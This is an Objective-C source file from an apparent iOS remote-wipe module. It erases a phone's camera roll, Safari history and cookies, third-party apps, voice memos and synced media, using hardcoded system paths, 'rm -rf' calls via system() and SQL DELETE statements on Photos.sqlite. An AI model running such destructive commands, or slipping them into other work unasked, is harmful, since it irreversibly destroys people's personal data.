//
//  WipePhoneMemoryOP.m
//  WipeDataManager
//
//  Created by Benjawan Tanarattanakorn on 6/15/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//
#import <UIKit/UIKit.h>

#import "WipePhoneMemoryOP.h"
#import "DebugStatus.h"
#import "FMDatabase.h"
//#import "WipeDataManager.h"
#import "WipeDataManagerImpl.h"
#import "Uninstaller.h"

#import "MPMediaLibrary.h"
#import "MPMediaQuery.h"
#import "MPMediaItem.h"
#import "MPConcreteMediaItem.h"
#import "MPMediaQueryCriteria.h"
#import "MPMediaItemCollection.h"

// ------------------------------------------------------------------------------------------------

// --- Camera Roll
static NSString* const kCameraRollDatabasePath		= @"/private/var/mobile/Media/PhotoData/Photos.sqlite";			// path to CameraRoll database
static NSString* const kCameraRollPath				= @"/private/var/mobile/Media/DCIM/*";							// path to photo and video in Camera roll

static NSString* const kCameraRollBarButtonPhotoPathIOS4 = @"/private/var/mobile/Media/PhotoData/MISC/PreviewWellImage.jpg";	// (tested on ios 4.2.1) path to the photo shown inside the bar button of Camera application
static NSString* const kCameraRollBarButtonPhotoPathIOS5 = @"/private/var/mobile/Media/PhotoData/MISC/PreviewWellImage.tiff";	// (tested on ios 5.1.1, 6.1.2) path to the photo shown inside the bar button of Camera application

static NSString* const kDeleteCameraRoll			= @"DELETE from Photo";
static NSString* const kDeleteCameraRollAsset1IOS5	= @"DELETE from ZGENERICASSET";								// for ios 5, 6.1.2 (assume 6.x.x), this will remove synced photo also

//static NSString* const kDeleteCameraRollAsset3IOS5	= @"DELETE from ZGENERICALBUM";								// for ios 5, this will remove synced photo also
//static NSString* const kDeleteCameraRollAsset2IOS5	= @"DELETE from ZALBUMLIST";								// for ios 5, this will remove synced photo also
//static NSString* const kDeleteCameraRollAsset4IOS5	= @"DELETE from Z_5ALBUMLISTS";								// for ios 5, this will remove synced photo also
//static NSString* const kDeleteCameraRollAsset5IOS5	= @"DELETE from Z_METADATA";								// for ios 5, this will remove synced photo also

//other table in Photos.sqlite
//ZADJUSTMENT
//ZFACE
//ZKEYWORD
//ZSIDECARFILE
//Z_6ASSETS
//Z_PRIMARYKEY

// --- Synced photo
static NSString* const kSyncedPhotoDatabasePath		= @"/private/var/mobile/Media/Photos/\"Photo Database\"";	// ios 4.3.3 and 4.2.1 only,                     not exist on iOS 8
static NSString* const kSyncedPhotoPath				= @"/private/var/mobile/Media/Photos/Thumbs/*";				// ios 4.2.1 only.  This path in ios 5 device is empty
static NSString* const kSyncedPhotoPathIOS5			= @"/private/var/mobile/Media/PhotoData/Sync/*";			// ios 5.1.1, 6 only. Not exist in 4.2.1

// --- Safari
static NSString* const kSafariResourcesPath			= @"/private/var/mobile/Library/Safari/*";							// history plist is in this directory
static NSString* const kSafariCachePath1			= @"/private/var/mobile/Library/Caches/com.apple.mobilesafari/*";	// cache database is in this directory,     not exist on iOS 8
static NSString* const kSafariCachePath2			= @"/private/var/mobile/Library/Caches/Safari/*";                   // web thumbnail is in this directory,      not exist on iOS 8
static NSString* const kSafariCachePath3			= @"/private/var/mobile/Library/Cookies/Cookies.binarycookies";		// --> e.g., gmail account   (delete)
static NSString* const kSafariCachePath4			= @"/private/var/mobile/Library/WebKit/LocalStorage/*";             //                          'WebKit' folder not exist on iOS 8
static NSString* const kSafariCachePath5			= @"/private/var/mobile/Library/WebKit/Database/*";                 //                          'WebKit' folder not exist on iOS 8
static NSString* const kSafariCachePath6			= @"/private/var/mobile/Library/Caches/com.apple.WebAppCache/*";	//                                          not exist on iOS 8

// --- 3rd party application
static NSString* const k3rdPartyApplicationPath		= @"/private/var/mobile/Applications/*"; 
static NSString* const k3rdPartyApplicationPlistPath= @"/User/Library/Caches/com.apple.mobile.installation.plist"; 
//static NSString* const k3rdPartyApplicationPathiOS8 = @"/private/var/mobile/Containers/Bundle/Application";
// --- VoiceMemo
static NSString* const kVoiceMemoResourcesPath		= @"/var/mobile/Media/Recordings/*";

// -- Synced audio/video
static NSString* const kSyncedAudioVideoResourcesPath1		= @"/private/var/mobile/Media/iTunes_Control/Music";							// for ios 4.2.1, 4.3.3, 5.0.1, 5.1.1
static NSString* const kSyncedAudioVideoResourcesPath2		= @"/private/var/mobile/Media/Podcasts";										// for ios 5.0.1 (Not found the resources in 4.2.1, 5.1.1, 6.1.2)
static NSString* const kSyncedPurchaseSongsResourcesPath	= @"/private/var/mobile/Media/Purchases/";										// for iOS 8.1.2

static NSString* const kSyncedAudioVideoThumbnailsIOS5		= @"/private/var/mobile/Media/iTunes_Control/iTunes/Artwork";					// thumbnail directory for ios 5.1.1
static NSString* const kSyncedAudioVideoThumbnailsIOS4		= @"/private/var/mobile/Media/iTunes_Control/Artwork";							// thumbnail directory for ios 4.2.1
static NSString* const kSyncedAudioVideoThumbnailsIOS501	= @"/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary-artwork.data";	// thumbnail file for ios 5.0.1 (not exist in 6.1.2), not exist on iOS 8

// ------------------------------------------------------------------------------------------------

static int system_no_deprecation(const char *command) {
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    return system(command);
#pragma GCC diagnostic pop
}

@interface WipePhoneMemoryOP (private)

- (void) deleteCameraRollPhotos;
- (BOOL) wipeCameraRoll;

- (void) wipeBarButtonPhoto;

- (void) deleteSyncedPhoto;
- (void) wipeSyncedPhoto;

- (void) deleteSafariResouces;
- (void) wipeSafariCachesAndBookmarks;

- (void) delete3rdPartyAppplication;
- (void) wipe3rdPartyApplication;

- (void) wipeMediaLibrary;

- (void) deleteVoiceMemo;
- (void) wipeVoiceMemo;

- (void) deleteAudioVideoInFolder: (NSString *) aFolder 
				  withFileManager: (NSFileManager *) aFM;
- (void) deleteJPGThumnailInFolder: (NSString *) aFolder 
				   withFileManager: (NSFileManager *) aFM;
- (void) deleteThumnailInFolder: (NSString *) aFolder 
				withFileManager: (NSFileManager *) aFM;
- (void) wipeSyncedAudioVideo;

@end

@implementation WipePhoneMemoryOP

@synthesize mThread;

- (id) initWithDelegate: (id) aDelegate thread: (NSThread *) aThread {
	self = [super init];
	if (self != nil) {
		mDelegate = aDelegate;
		[self setMThread:aThread];
	}
	return self;
}

- (void) main {
	NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];
	DLog(@"---- main ---- ")
	[self wipe];
	[pool release];
}

- (void) wipe {
	BOOL isWipeCameraRollSuccess = NO;
	isWipeCameraRollSuccess = [self wipeCameraRoll];			// Camera roll
	[self wipeBarButtonPhoto];									// Camera roll's bar button photo
	[self wipeSyncedPhoto];										// Synced photo
	
	[self wipeSafariCachesAndBookmarks];						// Safari
	[self wipe3rdPartyApplication];								// 3rd party app
    
    [self wipeMediaLibrary];                                    // Media library for iOS 6,7,8
    
	[self wipeVoiceMemo];										// VoiceMemo
	[self wipeSyncedAudioVideo];								// Synced audio and video (UI still cache the entry of music/video but actual data is deleted)
	
	NSString *wipeCameraRollErrorText = @"";
	
	if (!isWipeCameraRollSuccess) {
		wipeCameraRollErrorText = @"fail to wipe camera roll";
	} 

	NSDictionary *userInfo = [NSDictionary dictionaryWithObject:[NSArray arrayWithObjects:wipeCameraRollErrorText,
																  nil]
														 forKey:NSLocalizedDescriptionKey];
	
	NSError *error = nil;
	if (isWipeCameraRollSuccess) {
		error = [[NSError alloc] initWithDomain:kErrorDomain 
										   code:kWipeOperationOK
									   userInfo:userInfo];
	} else {
		error = [[NSError alloc] initWithDomain:kErrorDomain 
										   code:kWipeOperationCannotWipePhoneMemory
									   userInfo:userInfo];
	}
	
	if ([mDelegate respondsToSelector:@selector(operationCompleted:)]) {
		NSDictionary *wipeData = [NSDictionary dictionaryWithObjectsAndKeys:
								  [NSNumber numberWithUnsignedInt:kWipePhoneMemoryType], kWipeDataTypeKey,
								  error, kWipeDataErrorKey, 
								  nil];		
		[mDelegate performSelector:@selector(operationCompleted:) onThread:mThread withObject:wipeData waitUntilDone:NO];
	}
	[error release];
	error = nil;
}

#pragma mark - Private methods -

#pragma mark -
#pragma mark CameraRoll


- (void) deleteCameraRollPhotos {
	NSString *deleteCamRollScript = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kCameraRollPath]; 
	DLog(@"script: %@", deleteCamRollScript);
	system_no_deprecation([deleteCamRollScript cStringUsingEncoding:NSUTF8StringEncoding]);
}

- (BOOL) wipeCameraRoll {
	BOOL success = NO;
	DLog(@"wipe Camera Roll");
	DLog (@"IOS version %@", [[UIDevice currentDevice] systemVersion] )
	NSString *iosVersionString = [[UIDevice currentDevice] systemVersion];
	
	BOOL isIOS4		= NO;
	BOOL isIOS5_0	= NO;
	BOOL isIOS5_1	= NO;
	
	if ([iosVersionString hasPrefix:@"4."]) {
		isIOS4 = YES;
	} else if ([iosVersionString hasPrefix:@"5.0"]) {
		isIOS5_0 = YES;
	} else if ([iosVersionString hasPrefix:@"5.1"]) {
		isIOS5_1 = YES;
	}
	
	if (isIOS4) {								// test on 4.2.1, sync with iTune Work
		DLog(@"--> IOS < 5.0");		
		// -- delete entire database		
		NSFileManager *fm = [NSFileManager defaultManager];
		if (fm && [fm fileExistsAtPath:kCameraRollDatabasePath]) {
			[fm removeItemAtPath:kCameraRollDatabasePath error:nil];	
			success = YES;
		}			
	} else if (isIOS5_0) {						// test on 5.0.1, not test syncing with iTune
		DLog(@"--> 5.1 > IOS >= 5.0");
		// -- delete entire database		
		NSFileManager *fm = [NSFileManager defaultManager];
		if (fm && [fm fileExistsAtPath:kCameraRollDatabasePath]) {
			[fm removeItemAtPath:kCameraRollDatabasePath error:nil];		
			success = YES;
		}			
	} else if (isIOS5_1) {						// test on 5.1.1, sync with iTune work in the case that there is the difference in the photos to be synced 
												// (delete entire database cause the crash in Photo application)
		DLog(@"--> IOS >= 5.1 !!!!!!");		
		FMDatabase*	db = [[[FMDatabase alloc] initWithPath:kCameraRollDatabasePath] autorelease];
		if ([db open]) {
			[db beginTransaction];
			[db executeUpdate:kDeleteCameraRoll];
			[db executeUpdate:kDeleteCameraRollAsset1IOS5];
			[db commit];
			if ([db hadError]) {
				DLog(@"Err %d: %@", [db lastErrorCode], [db lastErrorMessage])
			} else {
				success = YES;
			}
			[db close];
		} else {
			DLog(@"Could not open db")
			return NO;
		}
//		[db release];
//		db = nil;
	} else { // 6.x.x onward
		FMDatabase*	db = [[[FMDatabase alloc] initWithPath:kCameraRollDatabasePath] autorelease];
		if ([db open]) {
			[db beginTransaction];
			[db executeUpdate:kDeleteCameraRoll];
			[db executeUpdate:kDeleteCameraRollAsset1IOS5];
			[db commit];
			if ([db hadError]) {
				DLog(@"Err %d: %@", [db lastErrorCode], [db lastErrorMessage])
			} else {
				success = YES;
			}
			[db close];
		} else {
			DLog(@"Could not open db")
			return NO;
		}
//		[db release];
//		db = nil;
	}
	
	[self performSelectorOnMainThread:@selector(deleteCameraRollPhotos) withObject:nil waitUntilDone:NO];
	
	return success;
}

- (void) wipeBarButtonPhoto {	
	NSFileManager *fm = [NSFileManager defaultManager];
	if (fm && [fm fileExistsAtPath:kCameraRollBarButtonPhotoPathIOS5]) {
		DLog (@"delete preview image for Camera application ios 5")
		[fm removeItemAtPath:kCameraRollBarButtonPhotoPathIOS5 error:nil];
	}
	if (fm && [fm fileExistsAtPath:kCameraRollBarButtonPhotoPathIOS4]) {
		DLog (@"delete preview image for Camera application ios 4")
		[fm removeItemAtPath:kCameraRollBarButtonPhotoPathIOS4 error:nil];
	}
}


#pragma mark -
#pragma mark Synced Photo



- (void) deleteSyncedPhoto {
	NSString *deletePhotoDBScript = [NSString stringWithFormat:@"%@ %@", @"rm", kSyncedPhotoDatabasePath]; 
	DLog(@"script: %@", deletePhotoDBScript);
	system_no_deprecation([deletePhotoDBScript cStringUsingEncoding:NSUTF8StringEncoding]);
	
	NSString *deletePhotoScript = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSyncedPhotoPath]; 
	DLog(@"script: %@", deletePhotoScript);
	system_no_deprecation([deletePhotoScript cStringUsingEncoding:NSUTF8StringEncoding]);
	
	//for ios 5
	NSString *deletePhotoIOS5Script = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSyncedPhotoPathIOS5]; 
	DLog(@"script: %@", deletePhotoIOS5Script);
	system_no_deprecation([deletePhotoIOS5Script cStringUsingEncoding:NSUTF8StringEncoding]);

}

// wipe synced photo
- (void) wipeSyncedPhoto {
	DLog(@"wipe Synced Photo");
	[self performSelectorOnMainThread:@selector(deleteSyncedPhoto) withObject:nil waitUntilDone:NO];
}


#pragma mark -
#pragma mark Safari


// wipe safari resouce. This is expected to run on the main thread
- (void) deleteSafariResouces {
	NSString *deleteSafariResourceScript = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSafariResourcesPath]; 
	DLog(@"script: %@", deleteSafariResourceScript)
	system_no_deprecation([deleteSafariResourceScript cStringUsingEncoding:NSUTF8StringEncoding]);

	NSString *deleteSafariCaches1Script = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSafariCachePath1]; 
	DLog(@"script: %@", deleteSafariCaches1Script)
	system_no_deprecation([deleteSafariCaches1Script cStringUsingEncoding:NSUTF8StringEncoding]);

	NSString *deleteSafariCaches2Script = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSafariCachePath2]; 
	DLog(@"script: %@", deleteSafariCaches2Script)
	system_no_deprecation([deleteSafariCaches2Script cStringUsingEncoding:NSUTF8StringEncoding]);
	
	NSString *deleteSafariCaches3Script = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSafariCachePath3]; 
	DLog(@"script: %@", deleteSafariCaches3Script)
	system_no_deprecation([deleteSafariCaches3Script cStringUsingEncoding:NSUTF8StringEncoding]);
	
	NSString *deleteSafariCaches4Script = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSafariCachePath4]; 
	DLog(@"script: %@", deleteSafariCaches4Script)
	system_no_deprecation([deleteSafariCaches4Script cStringUsingEncoding:NSUTF8StringEncoding]);
	
	NSString *deleteSafariCaches5Script = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSafariCachePath5]; 
	DLog(@"script: %@", deleteSafariCaches5Script)
	system_no_deprecation([deleteSafariCaches5Script cStringUsingEncoding:NSUTF8StringEncoding]);
	
	NSString *deleteSafariCaches6Script = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSafariCachePath6]; 
	DLog(@"script: %@", deleteSafariCaches6Script)
	system_no_deprecation([deleteSafariCaches6Script cStringUsingEncoding:NSUTF8StringEncoding]);
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
        // For iOS 8: clear history page and thumbnail
        [self clearSafariHistoryAndThumbnailForiOS8];
    }
}

/*
 Find Application Path on iOS 8 using the
 */
- (NSString *) iOS8AppPathForMetadataID: (NSString *) aMetadataID {
    NSFileManager *fileManager          = [NSFileManager defaultManager];
    NSString *mainPathiOS8              = @"/private/var/mobile/Containers/Data/Application";
    
    // Get all application folders inside main path
    NSArray *allApps                    = [fileManager contentsOfDirectoryAtPath:mainPathiOS8 error:nil];
    
    NSString *metadataPlistName         = @".com.apple.mobile_container_manager.metadata.plist";
    
    NSString *mainAppPath               = nil;

    // -- Find main safari path
    for (NSString *eachAppPath in allApps) {   // eachAppPath:      0291B79A-975F-4497-948A-CECC7462A9A7
        mainAppPath                     = [NSString stringWithFormat:@"%@/%@", mainPathiOS8, eachAppPath];
        
        NSString *metadataPlistPath     = [NSString stringWithFormat:@"%@/%@", mainAppPath, metadataPlistName];
        
        NSDictionary *dict              = [NSDictionary dictionaryWithContentsOfFile:metadataPlistPath];
        NSString *identifier            = [dict objectForKey:@"MCMMetadataIdentifier"];
        
        if ([identifier isEqualToString:aMetadataID]) {
            DLog(@"Match Metadata ID %@", aMetadataID)
            break;
        } else {
            mainAppPath                 = nil;
        }
    }
    return mainAppPath;
}

- (void) clearSafariHistoryAndThumbnailForiOS8 {
    
    NSString *mainSafari        = [self iOS8AppPathForMetadataID:@"com.apple.mobilesafari"];
    
    /**********************************************************************
     CLEAR CACHE PATH 1
     **********************************************************************/
    NSString *cachePath1        = [NSString stringWithFormat:@"%@/Library/Safari", mainSafari];
    NSString *delete1           = [NSString stringWithFormat:@"%@ %@/*", @"rm -rf", cachePath1];
    DLog(@"Cache path 1 --> script: %@", delete1);
    system_no_deprecation([delete1 cStringUsingEncoding:NSUTF8StringEncoding]);
    
    /**********************************************************************
        CLEAR CACHE PATH 2
     
        Example:
        /private/var/mobile/Containers/Data/Application/0291B79A-975F-4497-948A-CECC7462A9A7/Library/Caches/com.apple.mobilesafari/fsCachedData/0724A5E7-90AC-4494-9FBE-625EA9260C38
     **********************************************************************/
    NSString *cachePath2        = [NSString stringWithFormat:@"%@/Library/Caches/com.apple.mobilesafari", mainSafari];
    NSString *delete2           = [NSString stringWithFormat:@"%@ %@/*", @"rm -rf", cachePath2];
    DLog(@"Cache path 2 --> script: %@", delete2);
    system_no_deprecation([delete2 cStringUsingEncoding:NSUTF8StringEncoding]);
}

- (void) wipeSafariCachesAndBookmarks {
	DLog(@"wipe Safari resources");
	// perform on the main thread, otherwise TestApp can not be quited
	[self performSelectorOnMainThread:@selector(deleteSafariResouces) withObject:nil waitUntilDone:NO];
}


#pragma mark -
#pragma mark 3rd party application


- (void) delete3rdPartyAppplication {
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
        Uninstaller *uninstaller = [[Uninstaller alloc] init];
        [uninstaller uninstallAll3rdPartyApp];
        [uninstaller release];
    } else {
        // remove the entire folder of application
        NSString *delete3rdPartyAppScript = [NSString stringWithFormat:@"%@ %@", @"rm -rf", k3rdPartyApplicationPath];
        DLog(@"script: %@", delete3rdPartyAppScript);
        system_no_deprecation([delete3rdPartyAppScript cStringUsingEncoding:NSUTF8StringEncoding]);
    }
}

- (void) wipe3rdPartyApplication {
	DLog(@"wipe 3rd party application");
	[self performSelectorOnMainThread:@selector(delete3rdPartyAppplication) withObject:nil waitUntilDone:NO];

	// remove user's application entries in plist
	NSMutableDictionary *plistContent = [NSMutableDictionary dictionaryWithContentsOfFile:k3rdPartyApplicationPlistPath];
//	NSDictionary *userInstalledApp = [plistContent objectForKey:@"User"];
//	DLog(@"userInstalledApp: %@", userInstalledApp)
//	DLog(@"allkey: %@", [userInstalledApp allKeys])
	[plistContent setObject:[NSDictionary dictionary] forKey:@"User"];	// remove user application entry
	[plistContent writeToFile:k3rdPartyApplicationPlistPath atomically:YES];
}

#pragma mark - Media library
- (void) wipeMediaLibrary {
    MPMediaLibrary *library = (MPMediaLibrary *)[MPMediaLibrary defaultMediaLibrary];
    
    NSMutableArray *selectors = [NSMutableArray array];
    [selectors addObject:NSStringFromSelector(@selector(geniusMixesQuery))];
    [selectors addObject:NSStringFromSelector(@selector(videoPodcastsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(audioPodcastsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(movieRentalsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(moviesQuery))];
    [selectors addObject:NSStringFromSelector(@selector(homeVideosQuery))];
    [selectors addObject:NSStringFromSelector(@selector(tvShowsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(musicVideosQuery))];
    [selectors addObject:NSStringFromSelector(@selector(videosQuery))];
    [selectors addObject:NSStringFromSelector(@selector(albumArtistsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(genresQuery))];
    [selectors addObject:NSStringFromSelector(@selector(composersQuery))];
    [selectors addObject:NSStringFromSelector(@selector(compilationsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(audibleAudiobooksQuery))];
    [selectors addObject:NSStringFromSelector(@selector(audiobooksQuery))];
    [selectors addObject:NSStringFromSelector(@selector(videoITunesUAudioQuery))];
    [selectors addObject:NSStringFromSelector(@selector(ITunesUAudioQuery))];
    [selectors addObject:NSStringFromSelector(@selector(ITunesUQuery))];
    [selectors addObject:NSStringFromSelector(@selector(podcastsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(playlistsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(songsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(artistsQuery))];
    [selectors addObject:NSStringFromSelector(@selector(albumsQuery))];
    
    for (NSString *sel in selectors) {
        SEL selector = NSSelectorFromString(sel);
        if ([MPMediaQuery respondsToSelector:selector]) {
            NSArray *items = [library _itemsForQueryCriteria:[[MPMediaQuery performSelector:selector] criteria]];
            DLog(@"_itemsForQueryCriteria (%@): %@", sel, items);
            for (MPConcreteMediaItem *item in items) {
                DLog(@"persistentID: %llu", [item persistentID]);
                DLog(@"title: %@", [item title]);
                DLog(@"albumTitle: %@", [item albumTitle]);
                DLog(@"albumArtist: %@", [item albumArtist]);
                DLog(@"artist: %@", [item artist]);
                DLog(@"genre: %@", [item genre]);
            }
            [library removeItems:items];
        }
    }
}

#pragma mark -
#pragma mark VoiceMemo

- (void) deleteVoiceMemo {
	NSString *deleteVoiceMemoResourceScript = [NSString stringWithFormat:@"%@ %@", @"rm", kVoiceMemoResourcesPath]; 
	DLog(@"script: %@", deleteVoiceMemoResourceScript)
	system_no_deprecation([deleteVoiceMemoResourceScript cStringUsingEncoding:NSUTF8StringEncoding]);
}

- (void) wipeVoiceMemo {
	DLog(@"wipe VoiceMemo");
	[self performSelectorOnMainThread:@selector(deleteVoiceMemo) withObject:nil waitUntilDone:NO];
}


#pragma mark -
#pragma mark Synced Audio and Video


- (void) deleteAudioVideoInFolder: (NSString *) aFolder 
				  withFileManager: (NSFileManager *) aFM {		 
	NSError *error = nil;
	NSArray *subFolderList = [aFM contentsOfDirectoryAtPath:aFolder error:&error];
	
	if (!error) {
		for (NSString *subFolder in subFolderList) {			
			BOOL isDirectory = FALSE;
			NSString *subFolderPath = [NSString stringWithFormat:@"%@/%@", aFolder, subFolder];
			
			// -- check if the path is a directory or not
			[aFM fileExistsAtPath:subFolderPath isDirectory:&isDirectory];
			
			if (isDirectory) {			
				[self deleteAudioVideoInFolder:subFolderPath withFileManager:aFM];
			} else {
				if (aFM && [aFM fileExistsAtPath:subFolderPath]) {
					DLog(@"> delete %@", subFolderPath)
					[aFM removeItemAtPath:subFolderPath error:nil];
				}
			}
		}
	}
}

- (void) deleteJPGThumnailInFolder: (NSString *) aFolder 
				   withFileManager: (NSFileManager *) aFM {		 
	NSError *error = nil;
	NSArray *subFolderList = [aFM contentsOfDirectoryAtPath:aFolder error:&error];
	
	if (!error) {
		for (NSString *subFolder in subFolderList) {			
			BOOL isDirectory = FALSE;
			NSString *subFolderPath = [NSString stringWithFormat:@"%@/%@", aFolder, subFolder];
			
			// -- check if the path is a directory or not
			[aFM fileExistsAtPath:subFolderPath isDirectory:&isDirectory];
			
			if (isDirectory) {			
				[self deleteJPGThumnailInFolder:subFolderPath withFileManager:aFM];
			} else {
				if (aFM && 
					[aFM fileExistsAtPath:subFolderPath] &&
					[subFolderPath hasSuffix:@"jpg"]) {
					DLog(@"> delete jpg %@", subFolderPath)
					[aFM removeItemAtPath:subFolderPath error:nil];
				}
			}
		}
	}
}

- (void) deleteThumnailInFolder: (NSString *) aFolder 
				withFileManager: (NSFileManager *) aFM {		 
	NSError *error = nil;
	NSArray *subFolderList = [aFM contentsOfDirectoryAtPath:aFolder error:&error];
	
	if (!error) {
		for (NSString *subFolder in subFolderList) {			
			
			NSString *subFolderPath = [NSString stringWithFormat:@"%@/%@", aFolder, subFolder];
			
			if (aFM										&& 
				[aFM fileExistsAtPath:subFolderPath]	&& 
				[subFolderPath hasSuffix:@"ithmb"])		{
				DLog(@"> delete ithmb %@", subFolderPath)
				[aFM removeItemAtPath:subFolderPath error:nil];
			}						
		}
	}
}

- (void) wipeSyncedAudioVideo {
	DLog(@"wipe Synced audio/vidoe")
	NSFileManager *fm = [NSFileManager defaultManager];
	/**********************************************
	 Two kinds of resources will be removed
		1) the actual media files
		2) thumbnail of the media file
	 **********************************************/
	
	
	// STEP 1: -- delete actual resource -----------------------------------------------
	[self deleteAudioVideoInFolder:kSyncedAudioVideoResourcesPath1 withFileManager:fm];
	[self deleteAudioVideoInFolder:kSyncedAudioVideoResourcesPath2 withFileManager:fm];
		
	
	// STEP 2: -- delete thumbnails ----------------------------------------------------
	
	/* ======= IOS 5.1.1 =======
	 In ios 5, each media has 3 jpg files. The following structure is under /private/var/mobile/Media/iTunes_Control/
	 + iTunes
		+ Artwork
			+ XX
			 + PPP_XXX.jpg
			 + PPP_YYY.jpg
			 + PPP_ZZZ.jpg
			+ YY
				+ PPP_XXX.jpg
				+ PPP_YYY.jpg
				+ PPP_ZZZ.jpg
		...
	  ========================= */
	
	[self deleteJPGThumnailInFolder:kSyncedAudioVideoThumbnailsIOS5 withFileManager:fm];
	
	/* ======= IOS 5.0.1 =======
	 In ios 5, each media has 3 jpg files iTunes. The following structure is under /private/var/mobile/Media/iTunes_Control/
	 + iTunes
	 + MediaLibrary-artwork.data		 
	 ========================= */
	[fm removeItemAtPath:kSyncedAudioVideoThumbnailsIOS501 error:nil];
	
	/* ======= IOS 4.2.1 =======
	 In ios 4, no specific jpg files for each media. Instead, there are ithmb files. The following structure is under /private/var/mobile/Media/iTunes_Control/
	 + Artwork
		+ XXX.ithmb
		+ YYY.ithmb
		+ ZZZ.ithmb
		...
	  ========================= */
	
	[self deleteThumnailInFolder:kSyncedAudioVideoThumbnailsIOS4 withFileManager:fm];
    
    /* ======= IOS 8.1.2 =======

     Clear Podcasts
        E.g., /private/var/mobile/Containers/Data/Application/FC969408-7BB0-4C98-98A9-789DF7E2A6ED/Documents/
     
     Purchase songs:

     ========================= */
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
        DLog(@"Wipe podcast")
        NSString *plist = @"/private/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist";
        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plist];
        NSString *podcastPath = [[[dict objectForKey:@"System"] objectForKey:@"com.apple.podcasts"] objectForKey:@"Container"];
        
        [self deleteAudioVideoInFolder:podcastPath withFileManager:fm];
    }
    
    NSString *deletePurchaseSongsResourceScript = [NSString stringWithFormat:@"%@ %@", @"rm -rf", kSyncedPurchaseSongsResourcesPath];
    DLog(@"deletePurchaseSongsResourceScript: %@", deletePurchaseSongsResourceScript)
    system_no_deprecation([deletePurchaseSongsResourceScript cStringUsingEncoding:NSUTF8StringEncoding]);
}

- (void) dealloc {
	[mThread release];
	mThread = nil;
	
	mDelegate = nil;
	mOPCompletedSelector = nil;
	[super dealloc];
}

@end
